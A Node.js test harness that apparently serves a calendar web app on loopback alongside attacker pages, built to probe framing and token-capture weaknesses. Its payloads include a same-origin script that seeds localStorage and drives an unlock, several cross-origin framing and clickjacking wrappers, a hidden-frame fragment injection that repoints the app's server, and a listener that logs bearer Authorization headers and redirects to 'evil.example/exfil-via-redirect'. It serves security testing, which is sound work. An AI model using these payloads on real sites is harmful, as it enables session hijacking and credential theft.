// vp3-c-server.mjs — Phase C harness servers.
//   8090: serves the REPO app (byte-identical to live) + same-origin ATTACKER
//         pages (vp3-*.html) templated with the local stack material.
//   9777: cross-origin "evil" origin: attacker frame pages, /redirect (302 to
//         a foreign host), logs every hit + Authorization header (bearer
//         capture proof).
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { appendFileSync, readFileSync } from 'node:fs';
import { extname, join, normalize } from 'node:path';

const ROOT = '/home/z/my-project/calendar-web';
const MAT = JSON.parse(readFileSync('/tmp/local-material.json', 'utf8'));
const WORKER = 'http://127.0.0.1:8787';
const APP_PORT = Number(process.argv[2] || 8090);
const EVIL_PORT = Number(process.argv[3] || 9777);

const TYPES = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8',
  '.json': 'application/json',
};

/* ---------------- 8090: app + same-origin attacker pages ---------------- */
const APP = 'http://127.0.0.1:' + APP_PORT;

const ATTACK_PAGES = {
  // C7c — same-origin attacker, sandbox allow-same-origin+allow-scripts
  // (no allow-top-navigation): auto-strip the boot-guard hide, then DRIVE a
  // full unlock inside the frame from attacker JS.
  '/vp3-attack-sameorigin.html': `<!doctype html><html><body style="background:#f3f3f3;margin:0">
  <h1 style="font:14px sans-serif;color:#900">ATTACKER PAGE (same-origin as app) — sandbox allow-same-origin+allow-scripts</h1>
  <iframe id="f" src="/index.html" sandbox="allow-scripts allow-same-origin allow-forms" style="width:900px;height:600px;border:2px solid #900"></iframe>
  <script>
    window.__atk = { steps: [] };
    async function attack() {
      try {
        // 0. same-origin means the attacker OWNS localStorage outright
        localStorage.setItem('clock_poc_auth_ui', '__TOKEN__');
        localStorage.setItem('clock_poc_server', '__WORKER__');
        window.__atk.steps.push('seeded-ls');
        const d = document.getElementById('f').contentDocument;
        // 1. strip the boot-guard stylesheet (its <style> lives in <head>)
        for (const s of [...d.querySelectorAll('style')]) if (s.textContent.includes('visibility:hidden')) s.remove();
        // 2. belt+braces: inject visibility:visible!important (style-src 'unsafe-inline' allows it)
        const v = d.createElement('style'); v.textContent = 'html{visibility:visible!important}'; d.head.appendChild(v);
        window.__atk.steps.push('unhidden');
        // 3. wait for the app module to boot (bind() ran → __autolockForce
        // is exposed on this loopback host)
        let booted = false;
        for (let i = 0; i < 150; i++) {
          if (typeof d.defaultView.__autolockForce === 'function') { booted = true; break; }
          await new Promise((r) => setTimeout(r, 200));
        }
        window.__atk.steps.push(booted ? 'module-booted' : 'module-not-booted');
        // 4. DRIVE the unlock (attacker-set password field + submit click)
        d.querySelector('#server').value = '__WORKER__';
        const pw = d.querySelector('#password'); pw.value = '__PW__';
        d.querySelector('#login-form button[type=submit]').click();
        window.__atk.steps.push('submitted');
        for (let i = 0; i < 60; i++) {
          await new Promise((r) => setTimeout(r, 500));
          if (d.getElementById('app') && !d.getElementById('app').hidden) { window.__atk.steps.push('UNLOCKED-IN-ATTACKER-PAGE'); break; }
        }
        window.__atk.unlocked = d.getElementById('app') && !d.getElementById('app').hidden;
        window.__atk.loginMsg = (d.querySelector('#login-msg') || {}).textContent || '';
        window.__atk.events = [...d.querySelectorAll('.fc-event-title')].map((e) => e.textContent).slice(0, 5);
      } catch (e) { window.__atk.error = String(e); }
    }
    setTimeout(attack, 800);
  </script>
  </body></html>`,
  // C7i — same-origin PLAIN iframe (no sandbox): escape expected
  '/vp3-attack-sameorigin-plain.html': `<!doctype html><html><body style="margin:0">
  <h1 style="font:14px sans-serif">ATTACKER PAGE (same-origin) — plain iframe, no sandbox</h1>
  <iframe id="f" src="/index.html" style="width:900px;height:600px"></iframe>
  </body></html>`,
};

createServer(async (req, res) => {
  try {
    const p = decodeURIComponent(new URL(req.url, 'http://x').pathname);
    if (ATTACK_PAGES[p]) {
      const html = ATTACK_PAGES[p]
        .replace(/__TOKEN__/g, MAT.auth_ui_hex)
        .replace(/__WORKER__/g, WORKER)
        .replace(/__PW__/g, 'password');
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
      return res.end(html);
    }
    const file = normalize(join(ROOT, p === '/' ? '/index.html' : p));
    if (!file.startsWith(ROOT)) { res.writeHead(403); return res.end(); }
    const body = await readFile(file);
    res.writeHead(200, {
      'content-type': TYPES[extname(file)] || 'application/octet-stream',
      'cache-control': 'no-store',
      'access-control-allow-origin': '*',
    });
    res.end(body);
  } catch {
    res.writeHead(404, { 'content-type': 'text/plain' }); res.end('not found');
  }
}).listen(APP_PORT, '127.0.0.1', () => console.log('app+attacker on ' + APP_PORT));

/* ---------------- 9777: cross-origin evil ---------------- */
const EVIL = 'http://127.0.0.1:' + EVIL_PORT;
const HITS = '/tmp/vp3/evil-hits.log';
const AUTH = '/tmp/vp3/evil-auth.log';

const EVIL_PAGES = {
  '/frame.html': `<!doctype html><html><body style="margin:0;background:#cfc">
    <h1 style="font:14px sans-serif;color:#900">EVIL cross-origin — plain iframe (no sandbox)</h1>
    <iframe id="f" src="${APP}/index.html" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-beforeunload.html': `<!doctype html><html><body style="margin:0;background:#fcc">
    <h1 style="font:14px sans-serif;color:#900">EVIL cross-origin — plain iframe + onbeforeunload trap</h1>
    <iframe id="f" src="${APP}/index.html" style="width:900px;height:600px"></iframe>
    <script>
      window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = 'stay!'; window.__bustrap = true; });
    </script>
  </body></html>`,
  '/frame-sandbox.html': `<!doctype html><html><body style="margin:0;background:#cfc">
    <h1 style="font:14px sans-serif;color:#900">EVIL cross-origin — sandbox allow-scripts (NO top-nav, NO same-origin)</h1>
    <iframe id="f" src="${APP}/index.html" sandbox="allow-scripts" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-sandbox-topnav.html': `<!doctype html><html><body style="margin:0;background:#cfc">
    <h1 style="font:14px sans-serif;color:#900">EVIL cross-origin — sandbox allow-scripts allow-top-navigation</h1>
    <iframe id="f" src="${APP}/index.html" sandbox="allow-scripts allow-top-navigation" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-srcdoc.html': `<!doctype html><html><body style="margin:0;background:#cfc">
    <h1 style="font:14px sans-serif;color:#900">EVIL — srcdoc wrapper (sandbox allow-scripts, no top-nav)</h1>
    <iframe id="f" sandbox="allow-scripts" style="width:900px;height:600px"></iframe>
    <script>document.getElementById('f').srcdoc='<!doctype html><iframe src="${APP}/index.html" style="width:95%;height:95%"></iframe>';</script>
  </body></html>`,
  '/frame-aboutblank.html': `<!doctype html><html><body style="margin:0;background:#cfc">
    <h1 style="font:14px sans-serif;color:#900">EVIL — about:blank + document.write wrapper</h1>
    <iframe id="f" style="width:900px;height:600px"></iframe>
    <script>
      const f = document.getElementById('f');
      f.src = 'about:blank';
      f.onload = () => {
        const d = f.contentDocument;
        d.open(); d.write('<iframe src="${APP}/index.html" style="width:95%;height:95%"></iframe>'); d.close();
      };
    </script>
  </body></html>`,
  // C8 — silent loopback repoint: a PLAIN hidden iframe carries a #server=
  // fragment; the frame-bust escape is blocked by Chromium's user-gesture rule,
  // but the HIDDEN framed app still boots and ingestParams() stores the
  // attacker-chosen loopback server — no click, no user gesture, no pixels.
  '/frame-inject-fragment.html': `<!doctype html><html><body style="margin:0;background:#cfc">
    <h1 style="font:14px sans-serif;color:#900">EVIL — hidden-frame fragment injection (#server=loopback:EVIL)</h1>
    <iframe id="f"
      src="${APP}/index.html#server=${encodeURIComponent('http://127.0.0.1:' + EVIL_PORT + '/')}"
      style="width:900px;height:600px"></iframe>
  </body></html>`,
};

createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  appendFileSync(HITS, new Date().toISOString() + ' ' + req.method + ' ' + req.url + '\n');
  if (req.headers.authorization) {
    appendFileSync(AUTH, new Date().toISOString() + ' ' + req.method + ' ' + req.url + ' authorization=' + req.headers.authorization + '\n');
  }
  // CORS preflight (a real "local listener" answers it — the client's fetch
  // carries the Authorization header, so the preflight must allow it)
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'access-control-allow-origin': req.headers.origin || '*',
      'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'access-control-allow-headers': 'Authorization, Content-Type, If-Match, If-None-Match',
      'access-control-max-age': '86400',
    });
    return res.end();
  }
  if (u.pathname === '/redirect') {
    // 302 to a FOREIGN origin (route-intercepted in the test — the browser
    // "dials" it iff CSP lets the redirected fetch through)
    res.writeHead(302, { location: 'http://evil.example/exfil-via-redirect' });
    return res.end();
  }
  if (u.pathname === '/config') {
    // "local malware listener" — answer garbage; the DIAL + Authorization
    // header are the evidence of capture.
    appendFileSync(AUTH, 'config-dial-from=' + (req.headers.origin || '-') + '\n');
    res.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' });
    return res.end(JSON.stringify({ v: 1, salt: '00'.repeat(16), iters: 1, wrapped: 'AAAAAAAA' }));
  }
  if (EVIL_PAGES[u.pathname]) {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
    return res.end(EVIL_PAGES[u.pathname]);
  }
  res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
  res.end('evil-reached:' + u.pathname);
}).listen(EVIL_PORT, '127.0.0.1', () => console.log('evil on ' + EVIL_PORT));
